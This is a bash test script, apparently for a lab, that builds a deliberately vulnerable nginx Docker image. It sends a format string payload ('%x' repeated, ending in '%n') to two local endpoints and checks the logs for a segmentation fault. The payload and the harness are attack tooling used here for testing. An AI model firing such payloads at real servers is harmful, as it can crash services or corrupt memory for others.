#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# Function to print a section header
print_header() {
    local title=$1
    echo -e "\n${BLUE}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}${BOLD} $title${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════════════════════════╝${NC}"
}

# Function to print a subsection
print_subsection() {
    local title=$1
    echo -e "\n${CYAN}┌────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│${NC}${BOLD} $title${NC}"
    echo -e "${CYAN}└────────────────────────────────────────────────────────────┘${NC}"
}

# Function to check for Signal 11 (SIGSEGV)
check_signal_11() {
    local logs=$1
    if echo "$logs" | grep -q "exited on signal 11"; then
        print_header "Segmentation Fault Detected (Signal 11)"
        echo -e "${YELLOW}A segmentation fault (SIGSEGV) occurred, which indicates:${NC}"
        echo -e "1. The program attempted to access memory that it was not allowed to access"
        echo -e "2. The program attempted to access memory in a way that was not allowed"
        echo -e "3. This is a critical security vulnerability that could lead to:"
        echo -e "   - Denial of Service (DoS)"
        echo -e "   - Information disclosure"
        echo -e "   - Potential remote code execution"
        echo -e "\n${YELLOW}For more information about Signal 11, visit:${NC}"
        echo -e "https://www.liquidweb.com/blog/signal11/"
        return 1
    fi
    return 0
}

# Function to start container
start_container() {
    print_header "Starting Docker Container"
    docker run -d --name nginx-test -p 8080:80 nginx-format-string

    if [ $? -ne 0 ]; then
        echo -e "${RED}Failed to start container${NC}"
        exit 1
    fi

    echo -e "${GREEN}✓ Container started successfully${NC}"
    echo -e "${YELLOW}Waiting for Nginx to start...${NC}"
    sleep 2
}

# Function to clean logs
clean_logs() {
    print_subsection "Cleaning Nginx Logs"
    docker exec nginx-test sh -c "echo '' > /usr/local/nginx/logs/error.log"
    docker exec nginx-test sh -c "echo '' > /usr/local/nginx/logs/access.log"
}

# Function to stop and remove container
cleanup_container() {
    print_header "Cleaning Up Container"
    docker stop nginx-test
    docker rm nginx-test
}

# Function to test an endpoint
test_endpoint() {
    local endpoint=$1
    local payload=$2
    local example_num=$3
    
    print_header "Testing Example $example_num"
    echo -e "${YELLOW}Endpoint:${NC} $endpoint"
    echo -e "${YELLOW}Payload:${NC} $payload"

    # Send request and capture response with verbose output
    print_subsection "Request Details"
    curl -v -s -w "\n%{http_code}" "http://localhost:8080/$endpoint$payload" 2>&1

    # Send request again to capture response
    RESPONSE=$(curl -s -w "\n%{http_code}" "http://localhost:8080/$endpoint$payload")
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    BODY=$(echo "$RESPONSE" | sed '$d')

    print_subsection "Response Details"
    echo -e "${YELLOW}Response Code:${NC} $HTTP_CODE"
    echo -e "${YELLOW}Response Body:${NC}"
    echo "$BODY"

    # Check container logs
    print_subsection "Container Logs"
    CONTAINER_LOGS=$(docker logs nginx-test)
    echo "$CONTAINER_LOGS"
    local sig11_detected
    check_signal_11 "$CONTAINER_LOGS"
    sig11_detected=$?

    # Check error logs inside container
    print_subsection "Nginx Error Logs"
    ERROR_LOGS=$(docker exec nginx-test cat /usr/local/nginx/logs/error.log)
    echo "$ERROR_LOGS"
    check_signal_11 "$ERROR_LOGS"
    sig11_detected=$((sig11_detected || $?))

    # Check access logs inside container
    print_subsection "Nginx Access Logs"
    docker exec nginx-test cat /usr/local/nginx/logs/access.log

    # Clean logs for next test
    clean_logs

    return $sig11_detected
}

# Initialize results array
declare -A test_results

print_header "Building Docker Image"
docker build -t nginx-format-string .

if [ $? -ne 0 ]; then
    echo -e "${RED}Docker build failed${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Docker image built successfully${NC}"

# Start container for test
start_container

# Single payload for format string vulnerability
PAYLOAD="%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n"

print_header "Starting Format String Tests"

# Test both vulnerable endpoints with the payload
test_endpoint "vulnerable01" "$PAYLOAD" "1"
test_results["example1"]=$?

test_endpoint "vulnerable02" "$PAYLOAD" "2"
test_results["example2"]=$?

# Final cleanup
cleanup_container

# Print summary
print_header "Test Summary"
echo -e "${BOLD}Example 1 (vulnerable01):${NC}"
if [ ${test_results["example1"]} -eq 1 ]; then
    echo -e "${GREEN}✓ Vulnerability triggered (Segmentation Fault)${NC}"
else
    echo -e "${RED}✗ No vulnerability detected${NC}"
fi

echo -e "\n${BOLD}Example 2 (vulnerable02):${NC}"
if [ ${test_results["example2"]} -eq 1 ]; then
    echo -e "${GREEN}✓ Vulnerability triggered (Segmentation Fault)${NC}"
else
    echo -e "${RED}✗ No vulnerability detected${NC}"
fi

echo -e "\n${GREEN}=== Test complete ===${NC}" 